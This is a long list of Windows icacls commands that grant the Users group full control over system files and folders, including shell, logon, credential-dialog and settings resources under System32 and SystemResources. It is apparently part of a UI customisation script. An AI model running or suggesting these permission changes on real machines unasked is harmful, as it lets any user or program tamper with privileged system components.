icacls "C:\Windows\System32\Windows.UI.Xaml.Resources.rs1.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Resources.rs2.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Resources.rs3.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Resources.rs4.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Resources.rs5.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Resources.th.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Resources.win81.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.Xaml.Resources.win8rtm.dll" /t /Grant Users:F
icacls "C:\Windows\System32\Windows.UI.XamlHost.dll" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.AppDefaults.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.CredDialogController.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.FileExplorer.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.FileExplorer.WASDK.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.Immersive.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.Input.Inking.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.PicturePassword.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.Xaml.Controls.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.Xaml.InkControls.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.Xaml.Maps.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\en-US\Windows.UI.Xaml.Phone.dll.mui" /t /Grant Users:F
icacls "C:\Windows\System32\ShellExperiences\Windows.UI.Shell.SharedUtilities.dll" /t /Grant Users:F
icacls "C:\Windows\System32\WinMetadata\Windows.UI.winmd" /t /Grant Users:F
icacls "C:\Windows\System32\WinMetadata\Windows.UI.Xaml.winmd" /t /Grant Users:F
icacls "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\Windows.UI.ActionCenter.dll" /t /Grant Users:F
icacls "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\Windows.UI.QuickActions.dll" /t /Grant Users:F
icacls "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\Windows.UI.SoftLanding.dll" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.BioFeedback" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.BlockedShutdown" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Cred" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Immersive.dll.mun" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Logon" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.PCShell" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.PrintDialog" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.TaskManager" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\PRIS" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Windows.UI.AccountsControl.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-250.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-300.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-250.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-300.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-250.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-300.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-250.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-300.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-250.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-300.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-250.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-300.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-250.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-300.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-250.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-300.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.AccountsControl\PRIS\Windows.UI.AccountsControl.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.BioFeedback\Fonts" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.BioFeedback\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.BioFeedback\Windows.UI.BioFeedback.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.BioFeedback\Fonts\NUIMDL2.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.BioFeedback\pris\Windows.UI.BioFeedback.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.BlockedShutdown\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.BlockedShutdown\Windows.UI.BlockedShutdown.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.BlockedShutdown\pris\Windows.UI.BlockedShutdown.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Cred\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Cred\Windows.UI.Cred.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Cred\pris\Windows.UI.Cred.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Logon\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Logon\Windows.UI.Logon.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Logon\pris\Windows.UI.Logon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.PCShell\PeoplePane" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.PCShell\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.PCShell\Windows.UI.PCShell.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.PCShell\PeoplePane\Assets" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.PCShell\PeoplePane\Assets\SharMDL2.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.PCShell\pris\Windows.UI.PCShell.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.PrintDialog\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.PrintDialog\Windows.UI.PrintDialog.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.PrintDialog\pris\Windows.UI.PrintDialog.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Windows.UI.Search.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-140.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-180.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-80.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-140.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-180.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-80.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-140.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-180.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-80.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Search\pris\Windows.UI.Search.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\Windows.UI.SettingsAdminFlowUIThreshold.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\pris\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI\Assets" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI\Assets\Fonts" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI\Assets\Fonts\SetMDL2.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\Windows.UI.SettingsAppThreshold.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\pris\Windows.UI.SettingsAppThreshold.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\EdrCalibration.mkv" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\HDRSample.mkv" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\SDRSample.mkv" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\AXPIcons.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\AXPMDL2.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\BitMDL2.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\MemMDL2.2.2.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\SetMDL2.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\SettingsIcons.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt\Windows.UI.SettingsHandlers-nt.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt\pris\Windows.UI.SettingsHandlers-nt.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Windows.UI.Shell.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-400.png" /t /Grant Users:F
